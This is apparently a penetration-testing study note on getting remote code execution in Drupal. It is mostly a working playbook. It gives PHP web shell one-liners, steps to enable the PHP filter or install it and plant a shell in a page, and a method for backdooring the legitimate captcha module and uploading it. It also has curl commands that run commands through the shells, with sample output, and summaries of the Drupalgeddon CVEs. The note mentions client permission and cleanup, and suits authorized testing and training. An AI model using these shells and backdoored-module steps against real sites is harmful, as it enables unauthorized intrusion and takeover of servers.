## Drupal – Attacking
### Objective

- Achieve remote code execution via:    
    - PHP filter module
    - Backdoored module upload        
    - Known exploits (Drupalgeddon 1/2/3)
- Enumerate internal network, privilege escalate, or pivot further    

## 1. RCE via PHP Filter Module

### Drupal 7.x (PHP filter already available)

#### Steps:

1. Enable PHP Filter Module:

```
/admin/modules → check "PHP filter" → Save Configuration
```

2. Create Content:

```
/node/add → Basic Page
```

3. Insert Shell:

```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```

- Set Text format to `PHP code`        
- Save, e.g. URL: `/node/3`

4. Command Execution:
   
```bash
curl -s http://<target>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
#### Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Drupal 8.x and above

- PHP filter not available by default    
- Requires manual module installation (get client permission)
#### Install PHP Filter:

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

1. Navigate to:

```
/admin/reports/updates/install or /admin/modules/install
```

2. Upload module archive → Install

3. Enable PHP filter and repeat same page creation + RCE as in Drupal 7    
## 2. RCE via Backdoored Module Upload
### Backdoor Setup
#### Download Legit Module:

```bash
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
#### Add Web Shell:

```php
<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>
```
#### Add .htaccess:

```apache
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
#### Copy to Module Directory:

```bash
mv shell.php .htaccess captcha/
tar cvf captcha.tar.gz captcha/
```
### Upload via Admin Panel:

- Go to: `/admin/modules/install`    
- Upload `captcha.tar.gz`
- Install module
### Trigger Webshell:

```bash
curl -s http://<target>/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
#### Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## 3. Known Exploits – Drupalgeddon

### 3.1 Drupalgeddon (CVE-2014-3704)

- Vuln Type: Pre-auth SQLi → create admin or upload form    
- Affected: Drupal 7.0 – 7.31 (Fixed in 7.32)
### 3.2 Drupalgeddon2 (CVE-2018-7600)

- Vuln Type: RCE via unsanitized form input    
- Affected: < 7.58 and < 8.5.1
- Exploitable unauthenticated
### 3.3 Drupalgeddon3 (CVE-2018-7602)

- Vuln Type: RCE via Form API bypass    
- Affected: Many 7.x and 8.x versions
- Requires some interaction/access level    

Exploitation steps for these will follow in the next module as noted.
## Cleanup & Reporting

- Delete shells, uploaded modules, created nodes
- Disable PHP filter (if used)
- Log all artifacts:    
    - File names, MD5/SHA hashes
    - Paths, timestamps
    - Accessed URLs
- Document user accounts used for access (e.g., admin)  
### Summary of Techniques

|Method|Description|Priv Req|
|---|---|---|
|PHP Filter (7.x)|Enable module, create node with PHP shell|Admin|
|PHP Filter (8.x)|Install module manually then exploit|Admin|
|Backdoored Module|Upload tar.gz with shell + .htaccess|Admin|
|Drupalgeddon 1/2/3|SQLi / RCE / Form API abuse|Varies (some unauth)|
# Tags
> #Exploitation #Application-Exploitation #Drupal